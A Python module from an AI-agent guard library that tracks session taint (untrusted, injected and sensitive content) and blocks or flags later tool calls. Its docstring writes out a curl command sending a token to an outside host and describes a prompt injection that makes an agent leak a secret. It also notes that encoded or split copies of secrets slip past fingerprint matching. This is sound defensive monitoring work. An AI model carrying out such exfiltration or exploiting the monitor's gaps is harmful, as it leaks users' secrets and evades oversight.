"""Session taint tracking: judge each agent action in light of what the agent has already seen.

A single tool call rarely looks dangerous on its own. `curl https://api.example.com -d "$TOKEN"`
is ordinary. It becomes an attack when, earlier in the same session, the agent read a web page
that told it to do exactly that, and a file that held the token. Data theft from agents
needs three things together: **untrusted content** (something an attacker can write),
**sensitive data** (secrets, credentials, personal data) and a **way out** (network or shell).

A `SessionState` records the first two as the session goes on, and the tool policy uses
them to escalate the third:

| rule                    | when                                                                  | default |
|-------------------------|-----------------------------------------------------------------------|---------|
| `sensitive_data_egress` | a sensitive value seen earlier appears in a network/exec call         | block   |
| `trifecta`              | untrusted content + sensitive data seen, then a network/exec call     | review  |
| `after_injection`       | content with an injection was read, then a write/network/exec call    | review  |

Sensitive values are stored only as truncated SHA-256 fingerprints, never in the clear, so the
state is safe to persist. Fingerprints catch a value copied verbatim; an encoded or split copy
will not match, which is why the `trifecta` rule does not depend on them.

    session = guard.session("user-42")            # or GuardLayer(...).session() for a random id
    session.scan_tool_result("fetch", page)       # the page is untrusted; may mark it hostile
    session.scan_tool_result("read_file", dotenv) # secrets seen -> sensitive
    session.scan_tool_call("fetch", {"url": ..., "body": ...})   # escalated if it carries them

State lives in a `SessionStore`: in memory by default, or on disk (`FileSessionStore`) when each
check runs in a new process, as with Claude Code hooks.
"""

from __future__ import annotations

import fnmatch
import hashlib
import json
import os
import re
import tempfile
import threading
import time
import uuid
from collections import OrderedDict
from collections.abc import Iterable, Mapping
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import TYPE_CHECKING, Any, Protocol

from guardlayer.models import Action, Category, Detection, ScanResult, Verdict

if TYPE_CHECKING:  # pragma: no cover
    from guardlayer.pipeline import GuardLayer

SCANNER = "session"
HOSTILE_CATEGORIES = frozenset(
    {Category.PROMPT_INJECTION.value, Category.JAILBREAK.value, Category.KNOWN_ATTACK.value, Category.DATA_EXFILTRATION.value}
)
SENSITIVE_CATEGORIES = frozenset({Category.SECRET.value, Category.PII.value})
SENSITIVE_TOOL_RULES = frozenset({"credential_file", "dotenv_file"})
_NOT_SENSITIVE_PII = frozenset({"ip_address"})  # too common in logs to make a session "sensitive"
_TOKEN_RE = re.compile(r"[A-Za-z0-9_\-+/.@]{8,}")
MAX_SOURCES = 50
MAX_FINGERPRINTS = 1000


def fingerprint(value: str) -> str:
    return hashlib.sha256(value.strip(".=/").encode("utf-8")).hexdigest()[:24]


def _value_token(span_text: str) -> str | None:
    """The part of a matched span worth fingerprinting: its longest token (`password=hunter2x` -> `hunter2x`)."""
    tokens = _TOKEN_RE.findall(span_text)
    return max(tokens, key=len) if tokens else None


# ------------------------------------------------------------------------------------- state
@dataclass
class SessionState:
    id: str
    created: float = field(default_factory=time.time)
    updated: float = field(default_factory=time.time)
    untrusted_sources: list[str] = field(default_factory=list)  # where untrusted content came from
    hostile_sources: list[str] = field(default_factory=list)  # sources whose content held an injection
    sensitive_sources: list[str] = field(default_factory=list)  # where sensitive data was seen
    fingerprints: list[str] = field(default_factory=list)  # hashes of sensitive values
    events: int = 0

    @property
    def untrusted(self) -> bool:
        return bool(self.untrusted_sources)

    @property
    def hostile(self) -> bool:
        return bool(self.hostile_sources)

    @property
    def sensitive(self) -> bool:
        return bool(self.sensitive_sources)

    def summary(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "untrusted": self.untrusted,
            "hostile": self.hostile,
            "sensitive": self.sensitive,
            "untrusted_sources": self.untrusted_sources[-5:],
            "hostile_sources": self.hostile_sources[-5:],
            "sensitive_sources": self.sensitive_sources[-5:],
            "events": self.events,
        }

    def to_dict(self) -> dict[str, Any]:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: Mapping[str, Any]) -> SessionState:
        known = set(cls.__dataclass_fields__)
        return cls(**{k: v for k, v in data.items() if k in known})

    def merge(self, other: SessionState) -> None:
        """Union another copy of this session into this one (state only grows, so merging is safe)."""
        for name, cap in (("untrusted_sources", MAX_SOURCES), ("hostile_sources", MAX_SOURCES), ("sensitive_sources", MAX_SOURCES), ("fingerprints", MAX_FINGERPRINTS)):
            setattr(self, name, _add(getattr(other, name), getattr(self, name), cap))
        self.created = min(self.created, other.created)
        self.updated = max(self.updated, other.updated)
        self.events = max(self.events, other.events)


def _add(existing: list[str], new: Iterable[str], cap: int) -> list[str]:
    out = list(existing)
    seen = set(out)
    for item in new:
        if item not in seen:
            out.append(item)
            seen.add(item)
    return out[-cap:]


# ------------------------------------------------------------------------------------- stores
class SessionStore(Protocol):
    def get(self, session_id: str) -> SessionState | None: ...
    def put(self, state: SessionState) -> None: ...
    def delete(self, session_id: str) -> None: ...


class MemorySessionStore:
    """In-process store with an LRU cap and an idle timeout."""

    def __init__(self, max_sessions: int = 10_000, ttl_seconds: float | None = 24 * 3600) -> None:
        self.max_sessions = max_sessions
        self.ttl = ttl_seconds
        self._data: OrderedDict[str, SessionState] = OrderedDict()
        self._lock = threading.Lock()

    def get(self, session_id: str) -> SessionState | None:
        with self._lock:
            state = self._data.get(session_id)
            if state is None:
                return None
            if self.ttl is not None and time.time() - state.updated > self.ttl:
                del self._data[session_id]
                return None
            self._data.move_to_end(session_id)
            return state

    def put(self, state: SessionState) -> None:
        with self._lock:
            self._data[state.id] = state
            self._data.move_to_end(state.id)
            while len(self._data) > self.max_sessions:
                self._data.popitem(last=False)

    def delete(self, session_id: str) -> None:
        with self._lock:
            self._data.pop(session_id, None)

    def __len__(self) -> int:
        return len(self._data)


class FileSessionStore:
    """One JSON file per session, for checks that run in separate processes (e.g. Claude Code hooks).

    Each write takes a per-session lock file, merges with what is on disk and replaces the file
    atomically, so hooks running in parallel never lose each other's taint. A lock left behind by a
    crashed process expires after `stale_lock_seconds`.
    """

    def __init__(self, directory: str | Path, ttl_seconds: float | None = 7 * 24 * 3600, *, stale_lock_seconds: float = 10.0) -> None:
        self.dir = Path(directory).expanduser()
        self.ttl = ttl_seconds
        self.stale_lock_seconds = stale_lock_seconds

    def _path(self, session_id: str) -> Path:
        return self.dir / f"{hashlib.sha256(session_id.encode('utf-8')).hexdigest()[:32]}.json"

    def _read(self, path: Path) -> SessionState | None:
        for _ in range(20):
            try:
                return SessionState.from_dict(json.loads(path.read_text(encoding="utf-8")))
            except PermissionError:  # Windows: the file is being replaced right now
                time.sleep(0.005)
            except (OSError, ValueError, TypeError):
                return None
        return None

    def _lock(self, path: Path) -> Path | None:
        lock = path.with_suffix(".lock")
        deadline = time.monotonic() + 3.0
        while time.monotonic() < deadline:
            try:
                os.close(os.open(lock, os.O_CREAT | os.O_EXCL | os.O_WRONLY))
                return lock
            except FileExistsError:
                try:
                    if time.time() - lock.stat().st_mtime > self.stale_lock_seconds:
                        lock.unlink(missing_ok=True)
                        continue
                except OSError:
                    pass
                time.sleep(0.005)
            except PermissionError:  # Windows: the lock is being deleted by its owner
                time.sleep(0.005)
        return None  # could not lock: write anyway (merge still limits what can be lost)

    @staticmethod
    def _replace(tmp: str, path: Path) -> None:
        for attempt in range(100):
            try:
                os.replace(tmp, path)
                return
            except PermissionError:  # Windows: a reader has the target open
                if attempt == 99:
                    raise
                time.sleep(0.005)

    def get(self, session_id: str) -> SessionState | None:
        state = self._read(self._path(session_id))
        if state is None or state.id != session_id:
            return None
        if self.ttl is not None and time.time() - state.updated > self.ttl:
            return None
        return state

    def put(self, state: SessionState) -> None:
        self.dir.mkdir(parents=True, exist_ok=True)
        path = self._path(state.id)
        lock = self._lock(path)
        try:
            current = self._read(path)
            if current is not None and current.id == state.id:
                state.merge(current)
            fd, tmp = tempfile.mkstemp(dir=self.dir, prefix=".tmp-", suffix=".json")
            try:
                with os.fdopen(fd, "w", encoding="utf-8") as fh:
                    json.dump(state.to_dict(), fh)
                self._replace(tmp, path)
            except BaseException:
                Path(tmp).unlink(missing_ok=True)
                raise
        finally:
            if lock is not None:
                lock.unlink(missing_ok=True)

    def delete(self, session_id: str) -> None:
        self._path(session_id).unlink(missing_ok=True)


# ------------------------------------------------------------------------------------- policy
DEFAULT_SESSION_ACTIONS: dict[str, Action] = {
    "sensitive_data_egress": Action.BLOCK,
    "trifecta": Action.REVIEW,
    "after_injection": Action.REVIEW,
}


@dataclass
class SessionPolicy:
    """What counts as untrusted, and what to do when a tainted session tries to act.

    * `untrusted_tools`: tool-name globs whose results count as untrusted. By default a tool
      result is untrusted when the tool can reach the network or is untagged; `scan_context`
      input is always untrusted. `trusted_tools` excludes tools from both untrusted and hostile.
    * `actions`: action per session rule (`sensitive_data_egress`, `trifecta`, `after_injection`);
      set one to `"log"` to switch it off.
    """

    enabled: bool = True
    actions: dict[str, Action] = field(default_factory=lambda: dict(DEFAULT_SESSION_ACTIONS))
    untrusted_tools: list[str] = field(default_factory=list)
    trusted_tools: list[str] = field(default_factory=list)
    hostile_min_verdict: Verdict = Verdict.FLAG

    def __post_init__(self) -> None:
        merged = dict(DEFAULT_SESSION_ACTIONS)
        merged.update({k: Action(v) for k, v in self.actions.items()})
        unknown = set(merged) - set(DEFAULT_SESSION_ACTIONS)
        if unknown:
            raise ValueError(f"unknown session rule(s) {sorted(unknown)}; use {sorted(DEFAULT_SESSION_ACTIONS)}")
        self.actions = merged
        self.hostile_min_verdict = Verdict(self.hostile_min_verdict)

    def _matches(self, tool: str | None, patterns: list[str]) -> bool:
        return tool is not None and any(fnmatch.fnmatchcase(tool, p) for p in patterns)

    def is_trusted(self, tool: str | None) -> bool:
        return self._matches(tool, self.trusted_tools)

    def is_untrusted(self, tool: str | None, can_reach_network: bool) -> bool:
        if tool is None:
            return True
        return not self.is_trusted(tool) and (can_reach_network or self._matches(tool, self.untrusted_tools))


# ------------------------------------------------------------------------------------- tracking
def record_sensitive_values(state: SessionState, text: str, result: ScanResult) -> bool:
    """Fingerprint secret/PII spans in `text`. Returns True when anything sensitive was found."""
    found = False
    for d in result.detections:
        if d.category not in SENSITIVE_CATEGORIES or d.rule in _NOT_SENSITIVE_PII:
            continue
        found = True
        if d.span:
            token = _value_token(text[d.span[0] : d.span[1]])
            if token:
                state.fingerprints = _add(state.fingerprints, [fingerprint(token)], MAX_FINGERPRINTS)
    return found


def observe_content(
    policy: SessionPolicy, state: SessionState, text: str, result: ScanResult, *, source: str, tool: str | None, can_reach_network: bool
) -> None:
    """Update taint after the agent read `text` (a tool result or other third-party content)."""
    trusted = policy.is_trusted(tool)
    if policy.is_untrusted(tool, can_reach_network):
        state.untrusted_sources = _add(state.untrusted_sources, [source], MAX_SOURCES)
    if not trusted and result.effective_verdict >= policy.hostile_min_verdict and HOSTILE_CATEGORIES & set(result.categories):
        state.hostile_sources = _add(state.hostile_sources, [source], MAX_SOURCES)
    if record_sensitive_values(state, text, result):
        state.sensitive_sources = _add(state.sensitive_sources, [source], MAX_SOURCES)
    _touch(state)


def observe_input(state: SessionState, text: str, result: ScanResult) -> None:
    """User prompts are trusted, but secrets pasted into them are still sensitive data."""
    if any(d.category == Category.SECRET.value for d in result.detections):
        record_sensitive_values(state, text, result)
        state.sensitive_sources = _add(state.sensitive_sources, ["input"], MAX_SOURCES)
    _touch(state)


def observe_tool_call(state: SessionState, tool: str, result: ScanResult) -> None:
    """A call that reached a credential store or .env file (and was not blocked) makes the session sensitive."""
    if result.is_blocked:
        return
    if any(d.rule in SENSITIVE_TOOL_RULES for d in result.detections):
        state.sensitive_sources = _add(state.sensitive_sources, [f"tool:{tool}"], MAX_SOURCES)
    _touch(state)


def _touch(state: SessionState) -> None:
    state.updated = time.time()
    state.events += 1


def taint_detections(
    policy: SessionPolicy, state: SessionState, tool: str, caps: frozenset[str], tagged: bool, arguments_text: str
) -> list[Detection]:
    """Detections for a proposed tool call, given what the session has already seen."""
    if not policy.enabled:
        return []
    egress = not tagged or bool(caps & {"network", "exec"})
    acts = not tagged or bool(caps & {"network", "exec", "write"})
    out: list[Detection] = []

    def emit(rule: str, category: str, severity: float, message: str, **metadata: Any) -> None:
        out.append(Detection(SCANNER, rule, category, severity, message, metadata={"tool": tool, **metadata}, action=policy.actions[rule].value))

    if egress and state.fingerprints:
        known = set(state.fingerprints)
        if any(fingerprint(tok) in known for tok in _TOKEN_RE.findall(arguments_text)):
            emit("sensitive_data_egress", Category.DATA_EXFILTRATION.value, 1.0,
                 "A sensitive value seen earlier in this session is being sent out by a network/exec tool.",
                 sources=state.sensitive_sources[-5:])  # fmt: skip
    if egress and state.untrusted and state.sensitive:
        emit("trifecta", Category.DATA_EXFILTRATION.value, 0.7,
             "This session has read untrusted content and sensitive data; network/exec actions need approval.",
             untrusted=state.untrusted_sources[-5:], sensitive=state.sensitive_sources[-5:])  # fmt: skip
    if acts and state.hostile:
        emit("after_injection", Category.PROMPT_INJECTION.value, 0.7,
             "This session read content containing a prompt injection; side-effecting actions need approval.",
             hostile=state.hostile_sources[-5:])  # fmt: skip
    return out


# ------------------------------------------------------------------------------------- facade
class GuardSession:
    """A guard bound to one session: every scan reads and updates the session's taint."""

    def __init__(self, guard: GuardLayer, session_id: str | None = None) -> None:
        self.guard = guard
        self.id = session_id or uuid.uuid4().hex

    @property
    def state(self) -> SessionState:
        return self.guard.sessions.get(self.id) or SessionState(self.id)

    def scan_input(self, prompt: str, **kwargs: Any) -> ScanResult:
        return self.guard.scan_input(prompt, session=self.id, **kwargs)

    def scan_output(self, response: str, **kwargs: Any) -> ScanResult:
        return self.guard.scan_output(response, session=self.id, **kwargs)

    def scan_context(self, content: str, **kwargs: Any) -> ScanResult:
        return self.guard.scan_context(content, session=self.id, **kwargs)

    def scan_tool_call(self, tool_name: str, arguments: Any = None, **kwargs: Any) -> ScanResult:
        return self.guard.scan_tool_call(tool_name, arguments, session=self.id, **kwargs)

    def scan_tool_result(self, tool_name: str, result: Any, **kwargs: Any) -> ScanResult:
        return self.guard.scan_tool_result(tool_name, result, session=self.id, **kwargs)

    def reset(self) -> None:
        self.guard.sessions.delete(self.id)

    def __repr__(self) -> str:
        s = self.state
        return f"GuardSession({self.id!r}, untrusted={s.untrusted}, hostile={s.hostile}, sensitive={s.sensitive})"
